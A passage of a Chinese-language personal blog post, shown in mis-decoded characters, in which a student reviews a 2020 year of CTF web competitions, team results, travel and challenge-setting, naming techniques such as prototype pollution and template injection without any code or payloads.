alt></p><p>icqæ–°æ˜¥æˆ˜å½¹åº”è¯¥æ˜¯è‡ªå·±å¤´ä¸€æ¬¡æ„Ÿè§‰è‡ªå·±å¯’å‡çš„ä»˜å‡ºæ²¡ç™½è´¹ã€‚åƒæˆ‘è¿™ç§å¤©èµ‹æ¯”è¾ƒå·®çš„ï¼Œä¸€å¼€å§‹å­¦webåªèƒ½çº¯é åˆ·é¢˜ã€‚æœ€åèƒ½åšå‡ºå¤§éƒ¨åˆ†é¢˜è¿˜æ˜¯æ¯”è¾ƒæ»¡æ„çš„</p><p>ç„¶åå°±æ˜¯çªå¦‚å…¶æ¥çš„å…¥é˜Ÿé¢˜ï¼Œä¸€é“åŸå‹é“¾æ±¡æŸ“+rogue mysql ä»»æ„è¯»ã€‚æ±¡æŸ“è›®ç®€å•çš„ï¼Œrogue mysql å½“æ—¶æ²¡æ¥è§¦è¿‡ä¸€è„¸æ‡µé€¼ï¼Œä¸è¿‡åæ¥ç»™äº†å‚è€ƒèµ„æ–™çœ‹å°±èƒ½åšäº†ã€‚</p><p>3æœˆä»½ï¼Œxctfé«˜æ ¡æˆ˜å½¹ï¼Œè‡ªå·±ç»ˆäºç¬¬ä¸€æ¬¡èƒ½è·Ÿx1cçš„ä¼™ä¼´ä»¬ä¸€èµ·åšé¢˜äº†ã€‚ç„¶è€Œç¬¬ä¸€æ¬¡æ‰“xctfè¿™ç§è§„æ¨¡çš„æ¯”èµ›æ—¶è¿˜æœ‰äº›ä¸é€‚åº”ï¼Œå¥½å‡ é“é¢˜éƒ½æ˜¯åªä¼šåšä¸€éƒ¨åˆ†ï¼Œå´ä¸èƒ½å®Œæ•´çš„åˆ©ç”¨ã€‚å”¯ä¸€ä¸€ä¸ªå‡ ä¹èƒ½å®Œæ•´åšå®Œçš„webé¢˜æœ€åä¸€æ­¥åˆ©ç”¨ä¸äº†ã€‚ã€‚ã€‚æ‰€ä»¥è¯´å½“æ—¶æœ‰ç‚¹å°æŒ«æŠ˜å§ã€‚äºæ˜¯å°±å»buuåˆ·é¢˜äº†</p><p>æ¥ä¸‹æ¥å‡ ä¸ªæœˆå¯ä»¥è¯´åŸºæœ¬å°±æ˜¯å¸¸è§„åŒ–æ“ä½œï¼šä¸Šç½‘è¯¾ï¼Œå†™ä½œä¸šï¼Œåˆ·buuï¼Œæ°´åšå®¢ã€‚ç„¶åè§„æ¨¡ç›¸å¯¹å¤§ç‚¹çš„æ¯”èµ›å°±å»æ‰“ä¸€æ‰“ï¼Œctftimeä¸Šæ‰¾äº›å›½é™…èµ›çš„æœ‰è¶£é¢˜ã€‚ç»ˆäºbuué‚£è¾¹ä¸çŸ¥ä¸è§‰åˆ·åˆ°äº†webæ¦œä¸€ï¼Œxctfä¹ŸåŸºæœ¬èƒ½åš1ï¼Œ2ä¸ªweb.ä¸è¿‡æ¯”è¾ƒçœ‹é‡çš„æ¯”èµ›å°±ç›´æ¥æ— ç¼˜äº†ã€‚ã€‚ã€‚</p><p>6-8æœˆè¿™æ®µæ—¶é—´å°±æ¯”å¤æ‚å§ï¼Œå› ä¸ºå®è¯è¯´æ²¡ä»€ä¹ˆäº§å‡ºã€‚è‡ªå·±åŸºæœ¬å°±æ¯å¤©æ‰¾hacktheboxä¸Šçš„é¶æœºåšã€‚å¼€å§‹æ˜¯åªèƒ½æŒ‰ç…§wp,åšäº›é€€å½¹é¶æœºã€‚åæ¥å°è¯•äº†ä¸‹ç°å½¹çš„é¶æœºï¼Œæ„å¤–å‘ç°è¿˜èƒ½ä¸Šæ‰‹ï¼Ÿäºæ˜¯ä»ç®€å•ï¼Œåˆ°å›°éš¾ï¼Œåˆ°insaneéš¾åº¦éƒ½æœ‰å°è¯•ã€‚æœ‰æ—¶å€™ä¼šå› ä¸ºæ²¡æœ‰æ€è·¯å¡åœ¨ä¸€ä¸ªåœ°æ–¹å¾ˆä¹…å¾ˆä¹…ï¼Œåªèƒ½åœ¨htbè®ºå›ä¸Šæ‰¾å¤–å›½å‹äººæ±‚æŒ‡ç‚¹ã€‚æ¯”è¾ƒæ¬£æ…°çš„æ˜¯ï¼Œå¤§å®¶éƒ½å¾ˆä¹æ„ç»™æˆ‘ä¸€äº›æç¤ºï¼Œå¹¶åœ¨è‡ªå·±åšå‡ºæ¥åé“å£°ç¥è´ºã€‚æ‰€ä»¥è¯´æœ‰é—®é¢˜ä¸€å®šè¦å¤§èƒ†é—®å‘€ï¼ŒåŒæ—¶ä¹Ÿéå¸¸æ„Ÿè°¢é‚£äº›ç»™è¿‡æˆ‘å¸®åŠ©çš„äºº</p><p>ä¸è¿‡è¿™æ®µæ—¶é—´ä¹Ÿæœ‰äº›å°éƒé—·ï¼Œå› ä¸ºå‡ æ¬¡xctf webå‡ ä¹éƒ½æ²¡äººè¾“å‡ºäº†ã€‚å­¦å¼Ÿä»¬å½“æ—¶è¿˜æ²¡å…¥é˜Ÿï¼Œæ¯æ¬¡å„ç§æ¯”èµ›çœ‹webéƒ½åªæœ‰ä¸€ä¸ªæˆ–ä¸¤ä¸ªï¼Œæ²¡äººå¸®åŠ©ã€‚é‚£æ—¶å€™åæ¬¡ä¹Ÿéƒ½ä¸è¡Œï¼Œæ„Ÿè§‰è‡ªå·±ä¸€ä¸ªäººæ ¹æœ¬æ²¡æ³•carryã€‚cybricsè·Ÿwmctfæ›´æ˜¯æ„Ÿè§‰å°ç»¿è‰éƒ½æ²¡äººæ‰“äº†ï¼ˆåæ¥æ‰çŸ¥é“æ˜¯wmctfæ˜¯å»æ”¯æ´suäº†ï¼‰ã€‚æ€»ä¹‹pushäº†ä¸€ä¸‹å°±å†³å®šwebè¿™è¾¹æå‰è€ƒæ ¸äº†ã€‚</p><p>æ‰€ä»¥è¯´ï¼Œè¿™æ®µæ—¶é—´æ²¡ä»€ä¹ˆäººæ‰“x1cå¯¹æˆ‘æ¥è¯´æœ‰äº›æ¨è¿›çš„ä½œç”¨çš„ï¼Œæˆ‘ä¼šæ›´åŠ é€¼è¿«è‡ªå·±å»å¤šå­¦äº›å†…å®¹ï¼Œä¸ç„¶ç°æœ‰çš„å®åŠ›æ ¹æœ¬ä¸å¤Ÿã€‚</p><p>çœŸæ­£æœ‰æ‰€æ”¹è§‚çš„æ˜¯8æœˆä»½æœ«äº†ã€‚<br>æœ€æ—©å¼€å§‹æ˜¯å¤©ç¿¼æ¯,çº¿ä¸Šé ç¥¥å“¥carryè¿›final,ç„¶åfinalæ„å¤–çš„æ‰“åˆ°äº†äºŒç­‰å¥–ã€‚è®©æˆ‘è§‰å¾—è‡ªå·±æš‘å‡htbåšçš„è¿˜æ˜¯æŒºæœ‰ç”¨çš„hhh.ä¹‹åæ‰“äº†å›½èµ›ï¼Œæ‰“äº†é’“é±¼åŸï¼Œæ‰“äº†å¼ºç½‘æ¯ã€‚æˆ‘çš„åšé¢˜çŠ¶æ€ä¹Ÿä»æ»¡çŠ¶æ€åˆ°å¼€å§‹æ‘¸äº†ï¼ˆå…¶å®æ˜¯å› ä¸ºqwbéš¾åº¦æ¯”è¾ƒé«˜ï¼‰ã€‚</p><p>9æœˆä»½è¿”æ ¡ï¼Œå…ˆæ˜¯è¡¥ä¹‹å‰çš„æœŸæœ«è€ƒã€‚ä¸å¾—ä¸è¯´å› ä¸ºç½‘è¯¾è‡ªå·±çš„æ•ˆç‡ç¡®å®ä¸‹é™äº†ï¼Œè€ƒè¯•ä¸åƒä»¥å‰é‚£æ ·å¾—å¿ƒåº”æ‰‹ã€‚ä¸­é—´ç”µå·¥ç”µå­å› ä¸ºæ’ä¸Šå›½èµ›åˆ†åŒºèµ›è¿˜ç¼“è€ƒäº†ã€‚ï¼ˆä¸è¿‡æœ€åè¿˜æ˜¯95,è¿˜æ˜¯æŒºæ»¡æ„çš„ï¼‰</p><p>å›½èµ›åˆ†åŒºèµ›å°±æŒºæƒŠå¿ƒåŠ¨é­„äº†ã€‚å½“æ—¶æˆ‘ä»¬è¿™è¾¹ä¸¤ä¸ªå­¦å¼Ÿå»é’“é±¼åŸäº†ï¼Œåˆ†åŒºèµ›å°±åŒäººæ‰“ã€‚pwnçˆ·è¿˜å› ä¸ºè€ƒè¯•åªèƒ½æ‰“ç¬¬ä¸€å¤©ä¸Šåˆã€‚ä¸è¿‡å°±ç®—è¿™æ ·ï¼Œç¬¬ä¸€å¤©å¼€åœºä¸€ä¸ªåŠå°æ—¶è‡ªå·±å°±æŠŠå½“æ—¶web akäº†ï¼ˆä¸è¿‡æ¯”ä¸äº†rmbï¼‰ã€‚æ‹¿äº†1ä¸ªå¼±æ™ºä¸€è¡€è·Ÿä¸¤ä¸ª2è¡€ã€‚è¿›å…¥æŠ–è…¿çœ‹æ¦œé˜¶æ®µã€‚ç„¶è€Œæ²¡æœ‰pwnçœŸçš„ä¼¤â€¦â€¦ç¬¬äºŒå¤©æ›´æ˜¯å› ä¸ºåªæœ‰æˆ‘ä¸€ä¸ªäººå•æŒ‘ï¼Œå¿ƒæ€è´¼å·®ã€‚å½“æ—¶ä¸€ä¸ªä¸æ˜¯å¾ˆéš¾çš„pgsqléƒ½æ²¡åšå‡ºæ¥ã€‚æ€»ä¹‹ç¬¬äºŒå¤©æ¯”å®Œåæ€»æ„Ÿè§‰æ€»å†³èµ›æ²¡æˆäº†ï¼Œæ„Ÿè§‰åˆè¦é”™è¿‡å›½å­—å¤´æ¯”èµ›äº†â€¦â€¦ä¸è¿‡æœ€åå±…ç„¶ç¬¬7è¿›äº†ï¼Ÿæ„Ÿè°¢fmyyå…‰é€Ÿåšpwnæ•‘äº†æˆ‘ä»¬</p><p>ç„¶åå°±æ˜¯å›½èµ›çº¿ä¸‹ï¼Œåœ¨æ­¦æ±‰æ¯”+å›½åº†å‡æœŸã€‚æˆ‘ç›´æ¥å¸¦ä¸Šè¡Œæå°±èƒ½å›å®¶ä¼‘å‡233ã€‚</p><p>ä¸è¿‡æˆ‘ä»¬<code>æ¬¢è¿å¦¹å­æ‰“ç”µè¯</code>é¦–æ¬¡â€å‡ºå¾â€ä½“éªŒæå·®ã€‚åªå»äº†ä¸‰ä¸ªäººï¼Œfmyyæ‰“è¿‡ä¸€æ¬¡çº¿ä¸‹ï¼Œå‰©ä¸‹ä¸¤ä¸ªéƒ½æ˜¯ç¬¬ä¸€æ¬¡ã€‚ç¬¬ä¸€å¤©adç›´æ¥è¢«æš´æ‰“ã€‚æˆ‘ç›´åˆ°1ç‚¹é’Ÿæ‰èƒ½è®¿é—®åˆ°åˆ«äººé¶æœºï¼ˆé‚£æ—¶å€™å¹³å°å·²ç»ç‚¸äº†ï¼Œåˆ†éƒ½æ²¡äº†ï¼‰ï¼Œåœ¨æ­¤ä¹‹å‰éƒ½åªèƒ½è¢«åŠ¨ä¿®é¢˜æŒ¨æ‰“,æŠ“æµé‡éƒ½æ²¡æ³•å¤ç°å‡ºå»ã€‚ã€‚ã€‚<br><img src="https://i.imgur.com/BjRZTdv.jpg" class="lazyload" data-srcset="https://i.imgur.com/BjRZTdv.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥è¯´ylb sbä¸æ˜¯æ²¡æœ‰é“ç†çš„ã€‚æˆ‘ç¬¬ä¸€æ¬¡ä½“éªŒå°±è¿™ä¹ˆå·®çœŸå¾—ä¸€ç”Ÿé»‘</p><p>ç¬¬äºŒå¤©æ”¹è§£é¢˜ä¹Ÿæƒ¨æƒ¨ï¼Œå°±åšäº†ä¸ªwebçš„åŸå‹é“¾æ±¡æŸ“æ¸¸æˆé¢˜ã€‚web3å½“æ—¶å±…ç„¶å¿˜äº†é€ƒé€¸äº†ï¼Œå¯èƒ½äººè¢«ylbè¿·æƒ‘å‚»äº†å§ã€‚æ€»ä¹‹ç¬¬ä¸€æ¬¡å›½èµ›å°±è‰è‰ç»“æŸäº†ã€‚å¹¸å¥½X1cteamä»–ä»¬æ‹¿äº†å›½ä¸€ï¼Œä¸äºã€‚æ™šä¸Šå»æŠ½å¥–æ›´è¿·ï¼Œ%60+çš„ä¸­å¥–ç‡æˆ‘å®Œç¾é”™è¿‡ã€‚çœ‹æ¥å¤©ç”Ÿæ²¡è¿™ä¸ªè¿æ°”</p><p>å†é—®å€™ä¸€éylb<br><img src="https://i.imgur.com/H5m8IKA.jpg" class="lazyload" data-srcset="https://i.imgur.com/H5m8IKA.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç¬¬äºŒæ¬¡çº¿ä¸‹æ˜¯å·…å³°æå®¢ã€‚æ²¡è®°é”™çš„è¯å»å·…å³°æå®¢ä¹‹å‰æ˜¯bytectfçš„çº¿ä¸Šã€‚ç„¶åå°±æ˜¯ctfç”Ÿæ¶¯æ°¸è¿œçš„ç—›â€“<code>easyscrapy</code>ï¼Œåˆ©ç”¨é“¾æ‘¸æ¸…äº†ç»“æœå› ä¸ºèµ¶é£æœºæ²¡èƒ½æ¯”èµ›ä¸­è§£å‡ºã€‚ã€‚ã€‚å¥½åœ¨ä¸å½±å“è¿›çº¿ä¸‹ã€‚</p><p>æ¯”èµ›å‰ä¸€å¤©åœ¨æˆéƒ½è·Ÿé˜Ÿå‹ä»¬æ°ç«é”…ã€‚ä¸­åˆåƒçš„æ—¶å€™ä¸è§‰å¾—å¾ˆè¾£ï¼Œç»“æœèƒƒå‘Šè¯‰æˆ‘ä¸æ˜¯è¿™ä¹ˆä¸€å›äº‹ XP .<br><img src="https://i.imgur.com/66JokaK.jpg" class="lazyload" data-srcset="https://i.imgur.com/66JokaK.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å½“å¤©æ™šä¸Šç›´æ¥ä¸æ•¢ç¢°è¾£é”…äº†ã€‚è¿˜å¤´ä¸€æ¬¡è§åˆ°æˆéƒ½çš„ä¸‰é²œé”…å±…ç„¶æ˜¯è¾£/ç•ªèŒ„/æ¸…æ±¤ã€‚ä½©æœä½©æœ</p><p>ç¬¬äºŒå¤©æ¯”èµ›å‘ç°huashuiteamåœ¨æˆ‘å¯¹é¢ï¼Œæ‹äº†ä¸‹ylg</p><p><img src="https://i.imgur.com/INQCM0S.jpg" class="lazyload" data-srcset="https://i.imgur.com/INQCM0S.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ€åæ‹¿åˆ°å¥–æ¯è›®å¼€å¿ƒçš„ï¼Œæ¯•ç«ŸçœŸçš„å¥½ä¹…æ²¡äº§å‡ºäº†</p><p>æ™šä¸Šçœ‹äº†çœ¼IFSä¸Šçš„ç†ŠçŒ«~ æ„Ÿè§‰æˆéƒ½è¿™ä¸ªåŸå¸‚è¿˜æ˜¯æŒºä¸é”™çš„ã€‚ä¸è¿‡å‰ææ˜¯èƒ½æ‰¿å—çš„çš„å·®å¼‚ã€‚æ¯•ç«Ÿè¿™é‡Œèµ°å‡ æ­¥å°±èƒ½çœ‹è§ä¸€å®¶åŒæµå…”å¤´<br><img src="https://i.imgur.com/rSzQhmr.jpg" class="lazyload" data-srcset="https://i.imgur.com/rSzQhmr.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å·…å³°æå®¢æ¯”å®Œå›æ¥å†³å®šæ¢ç”µè„‘äº†ã€‚ä¹‹å‰çš„ç”µè„‘å¤ªå¡äº†ï¼Œå¯¼è‡´æ¯”èµ›æ—¶è™šæ‹Ÿæœº+2ä¸ªideå°±å¡æˆshiï¼Œæ€å‰æƒ³åæ¢äº†huawei matebook14.ä¸»è¦æ˜¯çœ‹é‡äº†æ€§ä»·æ¯”ï¼Œç„¶åè‡ªå·±åçˆ±è½»è–„æœ¬ï¼ŒåŠ ä¸Šä¸æ‰“æ¸¸æˆï¼Œæ€§èƒ½ç»å¯¹å¤Ÿç”¨äº†ã€‚è‡³äºmacå°±ç­‰ä»¥åè‡ªå·±éœ€è¦ç”Ÿäº§åŠ›æ—¶å†æé’±ä¹°å§ XD</p><p>ç„¶åå¥½åƒæ˜¯XNUCAçš„çº¿ä¸Šæ¥äº†ï¼Œæˆ‘åˆä¸€æ¬¡çˆ†é›¶ã€‚ã€‚ã€‚yysy oooooldjsè¿™é¢˜æŒºå¯¹æˆ‘èƒƒå£çš„ã€‚æˆ‘å½“æ—¶è°ƒè¯•äº†å¥½ä¹…ä¹Ÿæ˜¯æ‰¾åˆ°äº†åŸå‹é“¾æ±¡æŸ“çš„åœ°æ–¹å´æ²¡æ³•æ±¡æŸ“ï¼Œå§‹ç»ˆæ²¡æ‰¾åˆ°bypassçš„æ–¹æ³•ã€‚ç»“æœèµ›åæ²¡æƒ³åˆ°æ±¡æŸ“è¿˜åªæ˜¯è¿™é¢˜çš„ç¬¬ä¸€æ­¥orz.</p><p>ä¹‹åæ˜¯è¥¿æ¹–è®ºå‰‘çš„çº¿ä¸‹ï¼Œæ¬¢è¿å¦¹å­æ‰“ç”µè¯å†æ¬¡å‡ºæˆ˜</p><p><img src="https://i.imgur.com/pY3thoy.jpg" class="lazyload" data-srcset="https://i.imgur.com/pY3thoy.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>fmyy yyds.ç¥¥å“¥ yyds. ç›´æ¥æ‰“åˆ°ç¬¬7è„±ç¦»ä½ä¿ã€‚ç„¶åå¤§è…¿åœ¨ç™½æ³½å¤ºå† ï¼Œylg+éª‘é©´ä»–ä»¬huashuiteam ç¬¬äºŒã€‚æˆ‘ä»¬ç¬¬7,x1cæœ‰ä½ä¿ã€‚rrråœ¨ioté‚£ä¹Ÿæ‹¿äº†é’±ã€‚æ„Ÿè§‰æ–°/è€ç»¿è‰æŠ¢äº†ä¸å°‘é’± 2333</p><p>å›å¤´å¤ç°äº†ä¸‹æ²¡åšå‡ºæ¥çš„web,æ„Ÿè§‰å…¶å®ä¸éš¾ï¼Œä½†æ˜¯è°ƒè¯•è¿˜æ˜¯æŒºé‡è¦çš„ã€‚</p><p>ç„¶ånctf2020 æˆ‘å‡ºé¢˜ã€‚å…¶å®é™¤å¼€å›½èµ›ä»¥å¤–è‡ªå·±åŸºæœ¬å°±æ²¡æ€ä¹ˆæŠŠå‡ºå¥½çš„é¢˜å–ç»™å…¶ä»–å¹³å°ã€‚å› ä¸ºæˆ‘è§‰å¾—é«˜è´¨é‡çš„é¢˜æœ€å¥½èƒ½æ”¾è‡ªå·±å®¶çš„æ¯”èµ›ï¼Œæ¥åˆ†äº«çŸ¥è¯†ã€‚æ¯•ç«Ÿctfçš„ç›®çš„ä¸€ä¸ªæ˜¯have funï¼Œå¦ä¸€ä¸ªå°±æ˜¯èƒ½ä»é¢˜ç›®ä¸­æ”¶è·ä¸€äº›å¯¹ç°å®çœŸå®ç¯å¢ƒåˆ©ç”¨çš„æ–¹æ³•ã€‚å› ä¸ºå¾ˆé•¿ä¸€æ®µæ—¶é—´è‡ªå·±ä¸»è¦æ˜¯ç ”ç©¶nodejs,æ‰€ä»¥å°±æŠŠè¿™äº›æˆ‘è‡ªæˆ‘è®¤ä¸ºèƒ½è®©äººæœ‰æ‰€æ”¶è·çš„çŸ¥è¯†ç‚¹éƒ½æ”¾åœ¨æ ¡èµ›äº†ã€‚ï¼ˆå­¦é•¿ä»¬çš„å¥–åŠ±å¤ªä¸°åšäº†ã€‚ã€‚ã€‚ï¼‰<br>è€Œä¸”ç¡®å®ï¼Œä»å¸ˆå‚…ä»¬åšæˆ‘çš„é¢˜çš„è¿‡ç¨‹ä¸­æˆ‘ä¹Ÿçœ‹åˆ°ä¸€äº›å¾ˆæœ‰æ„æ€çš„ç‚¹ï¼ŒåŒ…æ‹¬ä¸€äº›éé¢„æœŸã€‚</p><p>ä¸¾ä¸ªä¾‹å­ã€‚package_managerä¸¤é“é¢˜æœ¬æ„æ˜¯åŸå‹é“¾æ±¡æŸ“æ‰“å­è¿›ç¨‹ã€‚ä¸è¿‡æœ‰äº›å¸ˆå‚…æ˜¯é æ—¥nunjucksåšå‡ºæ¥çš„ã€‚ç¡®å®æé†’äº†æˆ‘ä¸è¦ç›²ç›®ä¸è·Ÿæºç å°±é€‰æ¡†æ¶ã€‚æ›´æ„å¤–çš„æ˜¯æˆ‘ä»¬njuptçš„å¼€å‘dalaoç›´æ¥å¸®å¿™ä¿®å¤äº†è¿™ä¸ªé—®é¢˜233.è™½ç„¶ä¸æ˜¯0dayï¼Œä½†æ˜¯çš„ç¡®è§£å†³æ‰äº†nunjucksæ¨¡æ¿æ³¨å…¥çš„ä¸€ç§åˆ©ç”¨ã€‚</p><p><img src="https://i.imgur.com/ravy0uK.png" class="lazyload" data-srcset="https://i.imgur.com/ravy0uK.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ€ååˆ°äº†12æœˆï¼Œxnucaçº¿ä¸‹<br><img src="https://i.imgur.com/rmUrdsx.jpg" class="lazyload" data-srcset="https://i.imgur.com/rmUrdsx.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ¬æ¥æ˜¯æ‰“ç®—è¿‡å»æ¸—é€çš„ã€‚å¼€å§‹è¿˜æ‹…å¿ƒå·¥å…·æ˜¯ä¸æ˜¯æ²¡å‡†å¤‡å¥½ï¼Œç»“æœç°åœºçœ‹åˆ°èµ›åˆ¶ç›´æ¥å˜æˆå¼ºç½‘æ¯åŒæ¬¾git based AWD + KOHäº†ã€‚è€Œä¸”awdè¿˜æœ‰ä¸€åŠï¼ˆ2/4ï¼‰å…¶å®å°±æ˜¯è§£é¢˜â€¦â€¦<br>åªèƒ½è¯´çœŸçš„ç¡¬æ ¸ï¼Œæ€»å…±å°±ä¸€é“è§£é¢˜webã€‚å…¶ä»–çš„éƒ½æ˜¯ç¡¬æ ¸pwn. ezwpæ€è·¯é”™äº†å°±ä¸€è„¸æ‡µé€¼ã€‚åé¢çŸ¥é“æ˜¯pharååºåˆ—åŒ–åæ„Ÿè§‰è¿˜è¡Œï¼Ÿæ€»ä¹‹è°ƒäº†ä¸‹æ”¶è·æŒºå¤§çš„ã€‚ä¸è¿‡ç¡®å®æ„Ÿè§‰å¾—åˆ°è°ƒè¯•wordpressè¿™ç§æ¡†æ¶æºç æ¯”é‚£äº›æ¯”è¾ƒæ°´çš„cmséš¾å¤ªå¤šäº†ã€‚æ‰€ä»¥åé¢è‚¯å®šè¦ç ”ç©¶ä¸‹çš„ã€‚<br>å½“ç„¶é…’åº—çš„è‡ªåŠ©åƒçš„çœŸèˆ’æœã€‚fmyyè·Ÿpsbç–¯ç‹‚å¹²é¥­ï¼Œfmyyå›æ¥ç§°ä½“é‡ç›´æ¥èƒ–äº†7æ–¤233</p><p>ç„¶åå›å—äº¬å‘†äº†ä¸€å¤©å°±åˆå»åŒ—äº¬æ‰“å­—èŠ‚äº†</p><p><img src="https://i.imgur.com/GEjE7Iv.jpg" class="lazyload" data-srcset="https://i.imgur.com/GEjE7Iv.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å•åˆ·äº†ä¸‰é“ctf webã€‚å¯æƒœå…¶ä»–æ–¹å‘éƒ½ä¸ä¼šï¼Œç›´æ¥ggã€‚adç¬¬äºŒå¤©é fmyyçš„ä¸€è¡€æ€»ç®—ä¸æ˜¯å¤ªéš¾çœ‹ã€‚ç„¶åå°±æ²¡æœ‰ç„¶åäº†ï¼Œåˆæ˜¯è¢«miscæ”¯é…çš„æ—¥å­orz</p><p>ä¸è¿‡å­—èŠ‚ç¡®å®æœ‰é’±ã€‚æ¥ä¹‹å‰çš„é›¶é£Ÿå¤§ç¤¼åŒ…è·Ÿæ¯”å®Œåçš„å¤§ç¤¼åŒ…çœŸçš„ä¸°åšã€‚ã€‚ã€‚è€Œä¸”æŠ¥é“é‚£å¤©æ™šä¸Šé€›çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†è®¡ç®—æ‰€/ç‰©ç†æ‰€/ç©ºå¤©ä¿¡æ¯ç ”ç©¶æ‰€ï¼Œä»¥åŠä¸€äº›äº’è”ç½‘å¤§å‚ã€‚åªèƒ½æ„Ÿæ…¨å¸éƒ½ç¡®å®æ˜¯å¸éƒ½ï¼Œå¤§å‚äº‘é›†ã€‚ä¹Ÿè®¸ä»¥åä¹Ÿæœ‰è¿‡å»å‘å±•çš„æ„æ„¿</p><p>æ‰“å®Œå­—èŠ‚å°±å†³å®šè¯¥æš‚æ—¶é€€å½¹äº†ã€‚ç»“æœä¸€å‘¨åæ‰‹ç—’è¿˜æ˜¯æ‰“äº†huaweiCTFçš„ç¬¬ä¸€åœºï¼Œwebå·®ä¸€é¢˜ak.æœç„¶è¿˜æ˜¯tcl.ä¹Ÿå¯èƒ½æ˜¯å•åˆ·webçš„è¯è„‘å­é¡¶ä¸ä½å§ï¼Œæ²¡æƒ³åˆ°cloudé‚£é¢˜æŒ‚å¥½ä»£ç†æ˜¯æ‰“fpm <del>æ‰€ä»¥åä¸¤åœºå°±ä¸æ‰“äº†ã€‚æ¯•ç«Ÿè¿˜è¦å¤ä¹ æ¥ç€.</del> ä¹‹åæ‰‹ç—’è¿˜æ˜¯çœ‹äº†åä¸¤åœºï¼Œé™¤äº†æœ€åä¸€åœºçš„ezloginéƒ½åšå‡ºæ¥äº†ï¼ŒåŸºæœ¬éƒ½æ˜¯å‰å‡ solve.çœ‹æ¥ç°åœ¨è§£é¢˜çš„çŠ¶æ€è¿˜ä¸é”™ï¼Ÿä½†æ˜¯è¯¥é€€å½¹è¿˜æ˜¯å¾—é€€å½¹çš„</p><p>çš„ç¡®å¯ä»¥è¯´ï¼Œ2020å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯åœ¨è·Ÿctfæ‰“äº¤é“ã€‚æˆ‘å¾ˆé«˜å…´èƒ½å¤Ÿé€‰æ‹©è¿™æ¡è·¯å¹¶ä¸”å‚ä¸å…¶ä¸­ã€‚æ— è®ºåšé¢˜/å‡ºé¢˜/ç ”ç©¶/è°ƒè¯•æŸä¸ªæ¼æ´çš„è¿‡ç¨‹ï¼Œéƒ½æ˜¯å……æ»¡è¶£å‘³çš„ã€‚é‡è¦çš„æ˜¯å­¦åˆ°äº†çŸ¥è¯†ï¼Œè¿™æ ·æ‰ä¸è‡´äºæ¯å¤©ç¢Œç¢Œæ— ä¸ºï¼Œæµªè´¹å¤§å­¦çš„å¤§å¥½æ—¶å…‰ã€‚æœ‰æ—¶å€™è™½ç„¶æ„Ÿè§‰å¿ƒé‡Œä¸å¹³è¡¡ï¼Œå› ä¸ºä¸ºç«èµ›ä»˜å‡ºçš„åŠªåŠ›æ‰€å¸¦æ¥çš„æˆæœå¹¶ä¸èƒ½ä¸å…¶ä»–åŒå­¦ä¾é å¯¼å¸ˆæ‰€æ‹¿åˆ°çš„ç§‘ç 